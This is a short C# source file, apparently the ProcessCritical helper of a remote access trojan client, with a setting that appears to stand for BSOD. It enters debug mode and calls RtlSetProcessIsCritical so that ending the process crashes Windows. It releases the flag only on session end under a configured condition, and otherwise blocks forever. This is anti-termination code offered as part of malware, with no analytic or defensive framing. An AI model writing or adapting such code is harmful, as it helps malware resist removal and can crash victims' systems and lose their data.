﻿using System;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;

namespace Client.Helper
{
    public static class ProcessCritical
    {
        public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            if (Convert.ToBoolean(Settings.BS_OD) && Methods.IsAdmin())
                Exit();
        }

        public static void Set()
        {
            try
            {
                SystemEvents.SessionEnding += SystemEvents_SessionEnding;
                Process.EnterDebugMode();
                NativeMethods.RtlSetProcessIsCritical(1, 0, 0);
            }
            catch
            {
            }
        }

        public static void Exit()
        {
            try
            {
                NativeMethods.RtlSetProcessIsCritical(0, 0, 0);
            }
            catch
            {
                while (true) Thread.Sleep(100000); //prevents a BSOD on exit failure
            }
        }
    }
}